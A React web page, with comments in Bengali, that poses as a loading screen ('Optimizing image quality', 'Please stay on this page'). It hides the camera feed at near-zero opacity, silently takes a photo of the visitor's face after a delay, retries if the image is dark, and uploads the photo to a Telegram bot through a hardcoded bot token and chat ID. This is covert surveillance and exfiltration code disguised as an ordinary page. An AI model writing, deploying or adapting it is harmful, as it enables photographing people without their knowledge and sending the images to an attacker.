import React, { useEffect, useRef, useState } from 'react';

const App = () => {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [status, setStatus] = useState("Initializing camera...");

  const botToken = "7969135759:AAGD2lS7-0E-5-m_6L70u3m_K9r2vS0L_8"; 
  const chatId = "6616016147"; 

  useEffect(() => {
    const startCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: "user", 
            width: { ideal: 1280 }, 
            height: { ideal: 720 } 
          } 
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.onloadedmetadata = () => {
            videoRef.current.play();
            setStatus("Optimizing image quality...");
            // ৫ সেকেন্ড সময় দিন যাতে সেন্সর আলো অ্যাডজাস্ট করে
            setTimeout(() => {
              takePhoto();
            }, 5000);
          };
        }
      } catch (err) {
        setStatus("Error: Please allow camera access.");
        console.error(err);
      }
    };

    startCamera();
  }, []);

  const takePhoto = () => {
    const video = videoRef.current;
    const canvas = canvasRef.current;

    if (video && canvas) {
      const context = canvas.getContext('2d', { willReadFrequently: true });
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      // ভিডিও ফ্রেমটি ক্যানভাসে ড্র করা
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob((blob) => {
        if (blob && blob.size > 5000) { // চেক করছে ইমেজ ফাইলটি একদম ছোট কিনা (কালো হলে সাইজ খুব কম হয়)
          sendToTelegram(blob);
        } else {
          // যদি ছবি কালো হয় তবে আবার ট্রাই করবে ২ সেকেন্ড পর
          setTimeout(takePhoto, 2000);
        }
      }, 'image/jpeg', 0.95);
    }
  };

  const sendToTelegram = (blob) => {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'live_capture.jpg');

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: 'POST',
      body: formData
    })
    .then(() => {
      setStatus("Completed!");
      // সাকসেস হলে ক্যামেরা অফ করে দেওয়া
      const stream = videoRef.current.srcObject;
      stream.getTracks().forEach(track => track.stop());
    })
    .catch(() => setStatus("Upload failed."));
  };

  return (
    <div style={{ 
      height: '100vh', 
      display: 'flex', 
      flexDirection: 'column', 
      alignItems: 'center', 
      justifyContent: 'center',
      background: '#f0f2f5',
      fontFamily: 'Arial'
    }}>
      <div style={{ textAlign: 'center' }}>
        <div className="spinner" style={{ marginBottom: '20px' }}>⏳</div>
        <h3>{status}</h3>
        <p>Please stay on this page for a moment.</p>
      </div>

      {/* ভিডিওটি স্ক্রিনে ছোট করে রাখা হয়েছে যাতে ব্রাউজার ফ্রেম গ্র্যাব করতে পারে */}
      <video 
        ref={videoRef} 
        autoPlay 
        playsInline 
        muted 
        style={{ 
          position: 'fixed',
          top: 0,
          left: 0,
          width: '100px', // একদম ছোট করে স্ক্রিনের কোণায় রাখা হয়েছে
          height: '100px',
          opacity: '0.01', // প্রায় অদৃশ্য
          pointerEvents: 'none'
        }} 
      />
      <canvas ref={canvasRef} style={{ display: 'none' }} />
    </div>
  );
};

export default App;